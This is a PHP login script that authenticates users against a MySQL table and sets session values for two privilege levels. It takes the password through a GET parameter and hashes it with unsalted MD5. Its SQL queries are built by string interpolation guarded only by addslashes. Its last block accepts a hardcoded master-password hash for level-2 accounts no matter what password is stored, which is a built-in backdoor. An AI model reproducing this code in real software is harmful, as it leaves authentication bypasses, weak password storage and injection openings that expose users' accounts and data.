<?php
session_start();
include ('config.php');

$usuario = addslashes(filter_input(INPUT_GET, 'usuario')); 
$senha = md5(addslashes(filter_input(INPUT_GET, 'senha')));



if (empty($usuario)) {
    
    $valor = ['retorno' => '3'];
    echo json_encode($valor);
    exit;	
}elseif (empty($senha)) {

    $valor = ['retorno' => '3'];
    echo json_encode($valor);
    exit;
}



$verifica_usuario = 'a';
if (isset($_SESSION['login'])) {
	$verifica_usuario = $_SESSION['login'];
}







$query = mysqli_query($conexao, "SELECT * FROM usuario WHERE login = '$usuario' AND senha = '$senha' AND login = '$verifica_usuario' AND nivel = 2 AND status = 1") or die(mysqli_error($conexao));
$result = mysqli_fetch_array($query);
$usu = mysqli_num_rows($query);


if ($usu >= 1) {
	$_SESSION['logo'] = $result['logo'];
	$_SESSION['idusuario'] = $result['idusuario'];
	$_SESSION['idusuarioadmin'] = $result['idusuario'];
	$_SESSION['usu'] = $result['login'];

	 
    $valor = ['retorno' => '1'];
    echo json_encode($valor);
    exit;



}else{	

	$query2 = mysqli_query($conexao, "SELECT * FROM usuario WHERE login = '$usuario' AND senha = '$senha' AND nivel = 3 AND status = 1") or die(mysqli_error($conexao));
	$result2 = mysqli_fetch_array($query2);
	$adm = mysqli_num_rows($query2);

	if ($adm > 0) {
		$_SESSION['logo'] = $result2['logo'];
		$_SESSION['idusuario'] = $result2['idusuario'];
		$_SESSION['idusuariomaster'] = $result2['idusuario'];
		$_SESSION['usu'] = $result2['login'];
		$_SESSION['nome'] = $result2['nome'];

		$valor = ['retorno' => '2'];
	    echo json_encode($valor);
	    exit;
	
	}		
}


if($usu < 1){



$queryadm = mysqli_query($conexao, "SELECT * FROM usuario WHERE login = '$usuario' AND login = '$verifica_usuario' AND nivel = 2 AND status = 1") or die(mysqli_error($conexao));
$resultadm = mysqli_fetch_array($queryadm);
$usuadm = mysqli_num_rows($queryadm);


if ($usuadm >= 1 AND $senha == '241caeecee9391822b639d3539591471') {
	$_SESSION['logo'] = $resultadm['logo'];
	$_SESSION['idusuario'] = $resultadm['idusuario'];
	$_SESSION['idusuarioadmin'] = $resultadm['idusuario'];
	$_SESSION['usu'] = $resultadm['login'];

	 
    $valor = ['retorno' => '1'];
    echo json_encode($valor);
    exit;
    
}else{

		 $valor = ['retorno' => '0'];
		 echo json_encode($valor);
		 exit;
		
	}
}


?>